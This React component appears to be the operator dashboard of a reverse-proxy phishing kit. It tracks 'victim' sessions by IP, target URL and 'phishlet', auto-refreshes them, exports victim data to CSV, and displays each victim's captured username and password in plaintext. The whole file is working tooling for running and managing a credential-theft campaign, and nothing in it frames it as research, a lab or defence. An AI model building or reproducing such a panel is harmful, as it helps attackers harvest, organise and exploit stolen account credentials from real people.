'use client'

import { useState, useEffect } from 'react'
import { Activity, Users, Shield, AlertTriangle, CheckCircle, TrendingUp, Search, Filter, Download, Trash2, Eye, Clock, MapPin, Globe } from 'lucide-react'

interface Session {
  id: string
  victim_ip: string
  target_url: string
  phishlet_id: string
  user_agent: string
  status: string
  created_at: string
  last_active: string
  credentials?: {
    username: string
    password: string
  }
}

export default function SessionsTab() {
  const [sessions, setSessions] = useState<Session[]>([])
  const [loading, setLoading] = useState(true)
  const [searchTerm, setSearchTerm] = useState('')
  const [filterStatus, setFilterStatus] = useState('all')
  const [selectedSession, setSelectedSession] = useState<Session | null>(null)

  useEffect(() => {
    // Load sessions
    loadSessions()
    
    // Auto-refresh every 30 seconds
    const interval = setInterval(loadSessions, 30000)
    return () => clearInterval(interval)
  }, [])

  const loadSessions = async () => {
    try {
      const response = await fetch('/api/v1/sessions')
      const data = await response.json()
      setSessions(data.sessions || [])
    } catch (err) {
      console.error('Failed to load sessions:', err)
    } finally {
      setLoading(false)
    }
  }

  const deleteSession = async (id: string) => {
    if (!confirm('Delete this session?')) return
    
    try {
      await fetch(`/api/v1/sessions/${id}`, { method: 'DELETE' })
      setSessions(sessions.filter(s => s.id !== id))
    } catch (err) {
      console.error('Failed to delete session:', err)
    }
  }

  const exportSessions = () => {
    const csv = sessions.map(s => 
      `${s.id},${s.victim_ip},${s.target_url},${s.phishlet_id},${s.status},${s.created_at}`
    ).join('\n')
    
    const blob = new Blob([`ID,Victim IP,Target URL,Phishlet,Status,Created At\n${csv}`], { type: 'text/csv' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `sessions_${new Date().toISOString().split('T')[0]}.csv`
    a.click()
  }

  const filteredSessions = sessions.filter(session => {
    const matchesSearch = session.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         session.victim_ip.includes(searchTerm) ||
                         session.phishlet_id.toLowerCase().includes(searchTerm.toLowerCase())
    
    const matchesFilter = filterStatus === 'all' || session.status === filterStatus
    
    return matchesSearch && matchesFilter
  })

  const statusCounts = {
    all: sessions.length,
    active: sessions.filter(s => s.status === 'active').length,
    completed: sessions.filter(s => s.status === 'completed').length,
    failed: sessions.filter(s => s.status === 'failed').length
  }

  if (loading) {
    return (
      <div className="flex items-center justify-center h-96">
        <Activity className="w-12 h-12 animate-spin text-green-500" />
      </div>
    )
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-2xl font-bold text-green-400">SESSIONS</h2>
          <p className="text-green-700">Manage and monitor all captured sessions</p>
        </div>
        <button
          onClick={exportSessions}
          className="flex items-center space-x-2 px-4 py-2 bg-green-900/30 border border-green-700 rounded hover:bg-green-900/50 transition"
        >
          <Download className="w-4 h-4" />
          <span>Export CSV</span>
        </button>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-4 gap-4">
        {Object.entries(statusCounts).map(([status, count]) => (
          <div
            key={status}
            onClick={() => setFilterStatus(status)}
            className={`p-4 border rounded-lg cursor-pointer transition ${
              filterStatus === status
                ? 'bg-green-900/30 border-green-500'
                : 'bg-green-900/10 border-green-800 hover:border-green-600'
            }`}
          >
            <div className="text-2xl font-bold text-green-400">{count}</div>
            <div className="text-xs text-green-600 uppercase">{status}</div>
          </div>
        ))}
      </div>

      {/* Filters */}
      <div className="flex items-center space-x-4">
        <div className="flex-1 relative">
          <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-green-700" />
          <input
            type="text"
            placeholder="Search sessions..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="w-full pl-10 pr-4 py-2 bg-green-900/20 border border-green-800 rounded focus:outline-none focus:border-green-600 text-green-400"
          />
        </div>
        <div className="flex items-center space-x-2">
          <Filter className="w-4 h-4 text-green-700" />
          <select
            value={filterStatus}
            onChange={(e) => setFilterStatus(e.target.value)}
            className="px-4 py-2 bg-green-900/20 border border-green-800 rounded focus:outline-none focus:border-green-600 text-green-400"
          >
            <option value="all">All Status</option>
            <option value="active">Active</option>
            <option value="completed">Completed</option>
            <option value="failed">Failed</option>
          </select>
        </div>
      </div>

      {/* Sessions Table */}
      <div className="bg-green-900/10 border border-green-800 rounded-lg overflow-hidden">
        <table className="w-full">
          <thead className="bg-green-900/30">
            <tr>
              <th className="px-4 py-3 text-left text-xs font-bold text-green-500 uppercase">ID</th>
              <th className="px-4 py-3 text-left text-xs font-bold text-green-500 uppercase">Victim IP</th>
              <th className="px-4 py-3 text-left text-xs font-bold text-green-500 uppercase">Phishlet</th>
              <th className="px-4 py-3 text-left text-xs font-bold text-green-500 uppercase">Status</th>
              <th className="px-4 py-3 text-left text-xs font-bold text-green-500 uppercase">Created</th>
              <th className="px-4 py-3 text-left text-xs font-bold text-green-500 uppercase">Actions</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-green-900/30">
            {filteredSessions.length === 0 ? (
              <tr>
                <td colSpan={6} className="px-4 py-8 text-center text-green-700">
                  No sessions found
                </td>
              </tr>
            ) : (
              filteredSessions.map((session) => (
                <tr
                  key={session.id}
                  className="hover:bg-green-900/20 transition cursor-pointer"
                  onClick={() => setSelectedSession(session)}
                >
                  <td className="px-4 py-3 text-sm text-green-400 font-mono">{session.id}</td>
                  <td className="px-4 py-3 text-sm text-green-400">{session.victim_ip}</td>
                  <td className="px-4 py-3 text-sm">
                    <span className="px-2 py-1 bg-green-900/30 rounded text-xs text-green-400">
                      {session.phishlet_id}
                    </span>
                  </td>
                  <td className="px-4 py-3 text-sm">
                    <span className={`px-2 py-1 rounded text-xs ${
                      session.status === 'active' ? 'bg-green-900/50 text-green-400' :
                      session.status === 'completed' ? 'bg-blue-900/50 text-blue-400' :
                      'bg-red-900/50 text-red-400'
                    }`}>
                      {session.status}
                    </span>
                  </td>
                  <td className="px-4 py-3 text-sm text-green-600">
                    {new Date(session.created_at).toLocaleString()}
                  </td>
                  <td className="px-4 py-3 text-sm">
                    <div className="flex items-center space-x-2">
                      <button
                        onClick={(e) => { e.stopPropagation(); setSelectedSession(session) }}
                        className="p-1 hover:bg-green-900/50 rounded"
                        title="View details"
                      >
                        <Eye className="w-4 h-4 text-green-500" />
                      </button>
                      <button
                        onClick={(e) => { e.stopPropagation(); deleteSession(session.id) }}
                        className="p-1 hover:bg-red-900/50 rounded"
                        title="Delete"
                      >
                        <Trash2 className="w-4 h-4 text-red-500" />
                      </button>
                    </div>
                  </td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>

      {/* Session Details Modal */}
      {selectedSession && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4">
          <div className="bg-green-900/20 border border-green-700 rounded-lg max-w-2xl w-full max-h-[80vh] overflow-y-auto">
            <div className="p-6 space-y-4">
              <div className="flex items-center justify-between">
                <h3 className="text-xl font-bold text-green-400">Session Details</h3>
                <button
                  onClick={() => setSelectedSession(null)}
                  className="text-green-600 hover:text-green-400"
                >
                  ✕
                </button>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <div className="text-xs text-green-600 uppercase">Session ID</div>
                  <div className="text-green-400 font-mono">{selectedSession.id}</div>
                </div>
                <div>
                  <div className="text-xs text-green-600 uppercase">Status</div>
                  <div className="text-green-400">{selectedSession.status}</div>
                </div>
                <div>
                  <div className="text-xs text-green-600 uppercase">Victim IP</div>
                  <div className="text-green-400">{selectedSession.victim_ip}</div>
                </div>
                <div>
                  <div className="text-xs text-green-600 uppercase">Target URL</div>
                  <div className="text-green-400">{selectedSession.target_url}</div>
                </div>
                <div>
                  <div className="text-xs text-green-600 uppercase">Phishlet</div>
                  <div className="text-green-400">{selectedSession.phishlet_id}</div>
                </div>
                <div>
                  <div className="text-xs text-green-600 uppercase">User Agent</div>
                  <div className="text-green-400 text-sm">{selectedSession.user_agent}</div>
                </div>
                <div>
                  <div className="text-xs text-green-600 uppercase">Created</div>
                  <div className="text-green-400">{new Date(selectedSession.created_at).toLocaleString()}</div>
                </div>
                <div>
                  <div className="text-xs text-green-600 uppercase">Last Active</div>
                  <div className="text-green-400">{new Date(selectedSession.last_active).toLocaleString()}</div>
                </div>
              </div>

              {selectedSession.credentials && (
                <div className="border-t border-green-800 pt-4">
                  <div className="text-lg font-bold text-green-400 mb-3">Captured Credentials</div>
                  <div className="bg-green-900/30 rounded p-4 space-y-2">
                    <div>
                      <div className="text-xs text-green-600">Username</div>
                      <div className="text-green-400 font-mono">{selectedSession.credentials.username}</div>
                    </div>
                    <div>
                      <div className="text-xs text-green-600">Password</div>
                      <div className="text-green-400 font-mono">{selectedSession.credentials.password}</div>
                    </div>
                  </div>
                </div>
              )}

              <div className="flex items-center justify-end space-x-3 pt-4 border-t border-green-800">
                <button
                  onClick={() => setSelectedSession(null)}
                  className="px-4 py-2 bg-green-900/30 border border-green-700 rounded hover:bg-green-900/50 transition"
                >
                  Close
                </button>
                <button
                  onClick={() => { deleteSession(selectedSession.id); setSelectedSession(null) }}
                  className="px-4 py-2 bg-red-900/30 border border-red-700 rounded hover:bg-red-900/50 transition"
                >
                  Delete Session
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
